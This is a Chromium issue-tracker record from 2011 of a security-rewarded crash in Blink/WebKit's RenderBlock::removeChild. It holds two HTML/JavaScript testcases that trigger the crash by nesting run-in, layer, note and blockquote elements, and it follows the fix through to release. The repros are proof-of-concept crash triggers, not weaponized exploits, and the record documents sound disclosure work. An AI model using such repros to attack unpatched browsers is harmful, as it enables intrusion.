# Issue with merging anonymous block in renderblock::removechild (2)

| Field | Value |
|-------|-------|
| **Issue ID** | [40086877](https://issues.chromium.org/issues/40086877) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | in...@chromium.org |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-01-13 |
| **Bounty** | $1,000.00 |

## Description

Investigating second testcase from 68439.

Testcase::
<html><head><script type="text/javascript">
var el = Array();

function boom() {
el[5] = document.createElement('span');
el[5].style.display = 'run-in';
document.documentElement.appendChild(el[5]);

el[6] = document.createElement('span');
el[6].style.display = 'list-item';
document.documentElement.appendChild(el[6]);

el[17] = document.createElement('embed');
document.documentElement.appendChild(el[17]);

el[19] = document.createElement('layer');
document.documentElement.appendChild(el[19]);

el[29] = document.createElement('note');
document.documentElement.appendChild(el[29]);

el[37] = document.createElement('blockquote');
document.documentElement.appendChild(el[37]);

alert(0);

el[19].parentNode.removeChild(el[19]);
el[5].appendChild(el[19]);

alert(1);

el[29].parentNode.removeChild(el[29]);
el[19].appendChild(el[29]);

alert(2);

el[37].parentNode.removeChild(el[37]);
el[29].appendChild(el[37]);

alert(3);

el[17].parentNode.removeChild(el[17]);

alert(4);

el[6].parentNode.removeChild(el[6]); //Crash

alert('failed'); //Not reached
}
</script><body onload="boom();"></body><html>


## Timeline

### in...@chromium.org (2011-01-13)

Here is what i did wrong investigating the second testcase. I just removed all the alerts to make my life easier to test, however it should be replaced it with document.body.offsetTop to retrigger layout. Sorry, my bad. but this looks like a different layout issue. Investigating, at the moment, i am minimizing this.

### in...@chromium.org (2011-01-13)

Testcase

<html>
<body onload="runTest();">
<span style="display: run-in" id="runIn">
</span>
<span style="display: list-item" id="listItem">
</span>
<div id="result"></div>
<script>
if (window.layoutTestController)
{
    layoutTestController.dumpAsText();
    layoutTestController.waitUntilDone();
}

function runTest()
{
    document.body.offsetTop;
    var runIn = document.getElementById('runIn');
    var listItem = document.getElementById('listItem');

    var layerChild = document.createElement('layer');
    var noteChild = document.createElement('note');
    var blockquoteChild = document.createElement('blockquote');
	
    runIn.appendChild(layerChild);
	layerChild.appendChild(noteChild);
	noteChild.appendChild(blockquoteChild);
	
	document.body.offsetTop;
    
    document.body.removeChild(listItem);

    document.getElementById('result').innerHTML = "PASS";
    if (window.layoutTestController)
        layoutTestController.notifyDone();
}
</script>
</body>
</html>

### in...@chromium.org (2011-01-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-01-13)

filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=52402

### in...@chromium.org (2011-01-14)

Fixed in http://trac.webkit.org/changeset/75810

### sc...@gmail.com (2011-01-18)

@MartyBarbella: thanks for retesting and catching the fact that 1.html triggered something different to 0.html! It is appreciated.
The panel decided this warrants another $1000 Chromium Security Reward, congratulations and thanks again!
If you're not 100% sure that a set of repros represent the same bug, feel free to file distinct bugs. We won't be annoyed if any turn out to be duplicates, we promise!
We're rewarding this second bug at the $1000 level because it is a high-quality report:
- Good small repro.
- Inclusion of good quality stack traces, register analysis, etc.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### ma...@gmail.com (2011-01-18)

Good to know, if a similar case comes up in the future I'll file them as separate bugs. As before, nice job resolving this issue quickly.

### js...@chromium.org (2011-02-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-02-02)

Merged to m9 at: http://trac.webkit.org/changeset/77352


### js...@chromium.org (2011-02-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-02-12)

Invoice finalized; payment is in e-payment system.

Was fixed in 9.0.597.94

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/69556?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086877)*
